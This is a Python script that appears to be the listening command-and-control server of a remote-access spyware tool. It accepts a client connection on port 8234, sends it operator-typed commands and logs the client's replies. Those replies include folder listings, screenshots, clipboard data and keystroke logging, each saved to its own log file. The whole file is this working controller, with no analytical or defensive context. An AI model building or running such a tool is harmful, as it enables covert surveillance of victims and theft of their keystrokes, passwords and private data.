import socket
import os

def save_to_file(data, filename):
    with open(filename, 'a') as file:
        file.write(data + '\n')

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 8234))
    server_socket.listen(1)
    print("Server listening on port 8234...")

    client_socket, client_address = server_socket.accept()
    print(f"Connection established with {client_address}")

    while True:
        command_to_send = input("Enter command to send to the client: ")
        client_socket.send(command_to_send.encode())

        # Receive and display the response from the client
        response = client_socket.recv(4096).decode()
        print(f"Received response from client: {response}")

        # Save everything to a file
        save_to_file(response, 'server_log.txt')

        # Handle "get" command
        if command_to_send.startswith("get"):
            if response.startswith("List of folders:"):
                print("Received list of folders:")
                print(response[response.find(':') + 1:])
                save_to_file(response, 'folders_log.txt')
            elif response.startswith("Screenshot saved at"):
                print(response)
                save_to_file(response, 'screenshot_log.txt')
                # You can add further processing for screenshots if needed
            elif response.startswith("Clipboard data saved."):
                print(response)
                save_to_file(response, 'clipboard_log.txt')
                # You can add further processing for clipboard data if needed
            elif response.startswith("Key strokes logging started."):
                print(response)
                save_to_file(response, 'keystrokes_log.txt')
                # You can add further processing for key strokes logging if needed
            else:
                print(response)

    client_socket.close()
    server_socket.close()

if __name__ == "__main__":
    main()